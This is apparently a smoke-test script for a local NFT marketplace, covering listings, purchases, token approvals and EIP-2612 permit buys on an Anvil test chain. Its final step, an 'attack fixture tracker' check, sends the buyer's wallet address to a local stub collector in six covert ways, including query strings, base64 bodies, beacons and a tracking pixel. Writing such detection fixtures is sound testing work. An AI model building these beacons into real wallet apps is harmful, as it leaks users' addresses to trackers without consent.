import { createPublicClient, createWalletClient, http, parseSignature, maxUint256, parseAbi } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { defineChain } from "viem";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const config = JSON.parse(fs.readFileSync(path.join(__dirname, "config.local.json"), "utf8"));

const chain = defineChain({
  id: config.chainId,
  name: config.chainName,
  nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  rpcUrls: { default: { http: [config.rpcUrl] } },
});

const publicClient = createPublicClient({ chain, transport: http(config.rpcUrl) });

// Anvil key #1: Seller
const sellerAccount = privateKeyToAccount("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d");
const sellerWallet = createWalletClient({ account: sellerAccount, chain, transport: http(config.rpcUrl) });

// Anvil key #2: Buyer
const buyerAccount = privateKeyToAccount("0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a");
const buyerWallet = createWalletClient({ account: buyerAccount, chain, transport: http(config.rpcUrl) });

const marketAbi = parseAbi([
  "function list(uint256 tokenId, uint256 price) external returns (uint256 listingId)",
  "function cancel(uint256 listingId) external",
  "function buy(uint256 listingId) external",
  "function buyWithPermit(uint256 listingId, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
  "function listings(uint256 listingId) external view returns (address seller, bool active, uint256 tokenId, uint256 price)",
  "function activeListingOf(uint256 tokenId) external view returns (uint256 listingId)",
  "function isBuyable(uint256 listingId) external view returns (bool)",
  "function listingCount() external view returns (uint256)",
  "error SellerIsBuyer(uint256 listingId)"
]);

const nftAbi = parseAbi([
  "function mint() external returns (uint256)",
  "function ownerOf(uint256 tokenId) external view returns (address)",
  "function setApprovalForAll(address operator, bool approved) external",
  "function isApprovedForAll(address owner, address operator) external view returns (bool)",
  "function balanceOf(address owner) external view returns (uint256)"
]);

const tokenAbi = parseAbi([
  "function faucet() external",
  "function balanceOf(address account) external view returns (uint256)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function nonces(address owner) external view returns (uint256)",
  "function name() external view returns (string)"
]);

async function main() {
  console.log("=== PERMITMARKET ON-CHAIN SMOKE TEST ===");
  const results = {};

  // 1. Seller mints 3 passes
  console.log("1. Seller minting 3 passes...");
  const mint1Tx = await sellerWallet.writeContract({
    address: config.contracts.nft,
    abi: nftAbi,
    functionName: "mint"
  });
  await publicClient.waitForTransactionReceipt({ hash: mint1Tx });
  results.mint1Tx = mint1Tx;

  const mint2Tx = await sellerWallet.writeContract({
    address: config.contracts.nft,
    abi: nftAbi,
    functionName: "mint"
  });
  await publicClient.waitForTransactionReceipt({ hash: mint2Tx });
  results.mint2Tx = mint2Tx;

  const mint3Tx = await sellerWallet.writeContract({
    address: config.contracts.nft,
    abi: nftAbi,
    functionName: "mint"
  });
  await publicClient.waitForTransactionReceipt({ hash: mint3Tx });
  results.mint3Tx = mint3Tx;

  // Verify seller owns tokens 1, 2, 3
  const owner1 = await publicClient.readContract({ address: config.contracts.nft, abi: nftAbi, functionName: "ownerOf", args: [1n] });
  const owner2 = await publicClient.readContract({ address: config.contracts.nft, abi: nftAbi, functionName: "ownerOf", args: [2n] });
  const owner3 = await publicClient.readContract({ address: config.contracts.nft, abi: nftAbi, functionName: "ownerOf", args: [3n] });
  console.log(`Token 1 owner: ${owner1}, Token 2 owner: ${owner2}, Token 3 owner: ${owner3}`);

  // 2. Seller sets approval for all
  console.log("2. Seller approving marketplace for all NFTs...");
  const approveAllTx = await sellerWallet.writeContract({
    address: config.contracts.nft,
    abi: nftAbi,
    functionName: "setApprovalForAll",
    args: [config.contracts.marketplace, true]
  });
  await publicClient.waitForTransactionReceipt({ hash: approveAllTx });
  results.approveAllTx = approveAllTx;

  // 3. Seller lists 3 passes: 10 pUSD, 20 pUSD, 30 pUSD (pUSD has 6 decimals)
  console.log("3. Seller listing 3 passes...");
  const list1Tx = await sellerWallet.writeContract({
    address: config.contracts.marketplace,
    abi: marketAbi,
    functionName: "list",
    args: [1n, 10_000_000n]
  });
  await publicClient.waitForTransactionReceipt({ hash: list1Tx });
  results.list1Tx = list1Tx;

  const list2Tx = await sellerWallet.writeContract({
    address: config.contracts.marketplace,
    abi: marketAbi,
    functionName: "list",
    args: [2n, 20_000_000n]
  });
  await publicClient.waitForTransactionReceipt({ hash: list2Tx });
  results.list2Tx = list2Tx;

  const list3Tx = await sellerWallet.writeContract({
    address: config.contracts.marketplace,
    abi: marketAbi,
    functionName: "list",
    args: [3n, 30_000_000n]
  });
  await publicClient.waitForTransactionReceipt({ hash: list3Tx });
  results.list3Tx = list3Tx;

  // 4. Seller cancels listing 3 and relists
  console.log("4. Seller cancelling listing 3 and relisting...");
  const cancel3Tx = await sellerWallet.writeContract({
    address: config.contracts.marketplace,
    abi: marketAbi,
    functionName: "cancel",
    args: [3n]
  });
  await publicClient.waitForTransactionReceipt({ hash: cancel3Tx });
  results.cancel3Tx = cancel3Tx;

  const relist3Tx = await sellerWallet.writeContract({
    address: config.contracts.marketplace,
    abi: marketAbi,
    functionName: "list",
    args: [3n, 30_000_000n]
  });
  await publicClient.waitForTransactionReceipt({ hash: relist3Tx });
  results.relist3Tx = relist3Tx;
  // Relisted token 3 has listingId 4!

  // 5. Seller tries to buy own listing (listing 1) -> must revert SellerIsBuyer
  console.log("5. Checking seller cannot buy own listing...");
  let sellerBuyFailed = false;
  try {
    await sellerWallet.writeContract({
      address: config.contracts.marketplace,
      abi: marketAbi,
      functionName: "buy",
      args: [1n]
    });
  } catch (err) {
    sellerBuyFailed = true;
    console.log("Seller buy failed as expected (SellerIsBuyer error).");
  }
  if (!sellerBuyFailed) throw new Error("Seller should not be able to buy own listing!");

  // 6. Buyer faucet
  console.log("6. Buyer claiming faucet...");
  const faucetTx = await buyerWallet.writeContract({
    address: config.contracts.token,
    abi: tokenAbi,
    functionName: "faucet"
  });
  await publicClient.waitForTransactionReceipt({ hash: faucetTx });
  results.faucetTx = faucetTx;

  const buyerBalance = await publicClient.readContract({
    address: config.contracts.token,
    abi: tokenAbi,
    functionName: "balanceOf",
    args: [buyerAccount.address]
  });
  console.log(`Buyer balance: ${buyerBalance} (expected 100000000)`);

  // 7. Buyer buys listing 1 with "Enable one-click buying" (maxUint256 approval)
  console.log("7. Buyer buying listing 1 with unlimited approval...");
  const oneClickApproveTx = await buyerWallet.writeContract({
    address: config.contracts.token,
    abi: tokenAbi,
    functionName: "approve",
    args: [config.contracts.marketplace, maxUint256]
  });
  await publicClient.waitForTransactionReceipt({ hash: oneClickApproveTx });
  results.oneClickApproveTx = oneClickApproveTx;

  const buy1Tx = await buyerWallet.writeContract({
    address: config.contracts.marketplace,
    abi: marketAbi,
    functionName: "buy",
    args: [1n]
  });
  await publicClient.waitForTransactionReceipt({ hash: buy1Tx });
  results.buy1Tx = buy1Tx;

  const allowanceAfterOneClick = await publicClient.readContract({
    address: config.contracts.token,
    abi: tokenAbi,
    functionName: "allowance",
    args: [buyerAccount.address, config.contracts.marketplace]
  });
  console.log(`Allowance after one-click buy: ${allowanceAfterOneClick.toString()}`);
  if (allowanceAfterOneClick !== maxUint256) throw new Error("Allowance should remain maxUint256");
  results.allowanceAfterOneClick = allowanceAfterOneClick.toString();

  const newOwner1 = await publicClient.readContract({ address: config.contracts.nft, abi: nftAbi, functionName: "ownerOf", args: [1n] });
  console.log(`Token 1 new owner: ${newOwner1} (buyer: ${buyerAccount.address})`);

  // 8. Buyer buys listing 2 with "Approve exact amount"
  console.log("8. Buyer buying listing 2 with exact approval...");
  // Reset allowance to 0 first
  const resetApproveTx = await buyerWallet.writeContract({
    address: config.contracts.token,
    abi: tokenAbi,
    functionName: "approve",
    args: [config.contracts.marketplace, 0n]
  });
  await publicClient.waitForTransactionReceipt({ hash: resetApproveTx });
  results.resetApproveTx = resetApproveTx;

  // Approve exact price (20 pUSD = 20_000_000)
  const exactApproveTx = await buyerWallet.writeContract({
    address: config.contracts.token,
    abi: tokenAbi,
    functionName: "approve",
    args: [config.contracts.marketplace, 20_000_000n]
  });
  await publicClient.waitForTransactionReceipt({ hash: exactApproveTx });
  results.exactApproveTx = exactApproveTx;

  const buy2Tx = await buyerWallet.writeContract({
    address: config.contracts.marketplace,
    abi: marketAbi,
    functionName: "buy",
    args: [2n]
  });
  await publicClient.waitForTransactionReceipt({ hash: buy2Tx });
  results.buy2Tx = buy2Tx;

  const allowanceAfterExact = await publicClient.readContract({
    address: config.contracts.token,
    abi: tokenAbi,
    functionName: "allowance",
    args: [buyerAccount.address, config.contracts.marketplace]
  });
  console.log(`Allowance after exact buy: ${allowanceAfterExact.toString()} (expected 0)`);
  if (allowanceAfterExact !== 0n) throw new Error("Allowance should be 0 after exact buy!");
  results.allowanceAfterExact = allowanceAfterExact.toString();

  const newOwner2 = await publicClient.readContract({ address: config.contracts.nft, abi: nftAbi, functionName: "ownerOf", args: [2n] });
  console.log(`Token 2 new owner: ${newOwner2} (buyer: ${buyerAccount.address})`);

  // 9. Buyer buys listing 4 (pass 3) with EIP-2612 permit (no prior approve tx)
  console.log("9. Buyer buying listing 4 with EIP-2612 permit signature...");
  const deadline = BigInt(Math.floor(Date.now() / 1000) + 20 * 60);
  const nonce = await publicClient.readContract({
    address: config.contracts.token,
    abi: tokenAbi,
    functionName: "nonces",
    args: [buyerAccount.address]
  });
  const name = await publicClient.readContract({
    address: config.contracts.token,
    abi: tokenAbi,
    functionName: "name"
  });

  const signature = await buyerWallet.signTypedData({
    domain: {
      name,
      version: "1",
      chainId: config.chainId,
      verifyingContract: config.contracts.token
    },
    types: {
      Permit: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" }
      ]
    },
    primaryType: "Permit",
    message: {
      owner: buyerAccount.address,
      spender: config.contracts.marketplace,
      value: 30_000_000n,
      nonce,
      deadline
    }
  });

  const { v, r, s } = parseSignature(signature);

  const buyWithPermitTx = await buyerWallet.writeContract({
    address: config.contracts.marketplace,
    abi: marketAbi,
    functionName: "buyWithPermit",
    args: [4n, deadline, Number(v), r, s]
  });
  await publicClient.waitForTransactionReceipt({ hash: buyWithPermitTx });
  results.buyWithPermitTx = buyWithPermitTx;

  const allowanceAfterPermit = await publicClient.readContract({
    address: config.contracts.token,
    abi: tokenAbi,
    functionName: "allowance",
    args: [buyerAccount.address, config.contracts.marketplace]
  });
  console.log(`Allowance after permit buy: ${allowanceAfterPermit.toString()} (expected 0)`);
  if (allowanceAfterPermit !== 0n) throw new Error("Allowance should be 0 after permit buy!");
  results.allowanceAfterPermit = allowanceAfterPermit.toString();

  const newOwner3 = await publicClient.readContract({ address: config.contracts.nft, abi: nftAbi, functionName: "ownerOf", args: [3n] });
  console.log(`Token 3 new owner: ${newOwner3} (buyer: ${buyerAccount.address})`);

  // 10. Attack fixture tracker test: test 6 methods against stub at 9132
  console.log("10. Testing attack fixture tracker submissions to http://127.0.0.1:9132/collect...");
  const TRACKER = "http://127.0.0.1:9132/collect";
  const address = buyerAccount.address;

  // 1. GET ?addr=...
  await fetch(TRACKER + "?addr=" + address);
  // 2. GET ?a=...
  await fetch(TRACKER + "?a=" + address.slice(2).toLowerCase());
  // 3. POST JSON
  await fetch(TRACKER, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ wallet: address }) });
  // 4. POST base64
  await fetch(TRACKER, { method: "POST", headers: { "content-type": "text/plain" }, body: Buffer.from(address).toString("base64") });
  // 5. Beacon (POST)
  await fetch(TRACKER, { method: "POST", headers: { "content-type": "text/plain" }, body: JSON.stringify({ w: address }) });
  // 6. Image pixel GET
  await fetch(TRACKER + "?px=" + encodeURIComponent(address));

  const logRes = await fetch("http://127.0.0.1:9132/log");
  const logEntries = await logRes.json();
  console.log(`Tracker stub received ${logEntries.length} entries`);
  if (logEntries.length < 6) throw new Error(`Expected at least 6 tracker entries, got ${logEntries.length}`);

  console.log("ALL ON-CHAIN AND FIXTURE SMOKE CHECKS PASSED!");
  console.log(JSON.stringify(results, null, 2));

  fs.writeFileSync(path.join(__dirname, "smoke-results.json"), JSON.stringify(results, null, 2));
}

main().catch((err) => {
  console.error("SMOKE TEST FAILED:", err);
  process.exit(1);
});

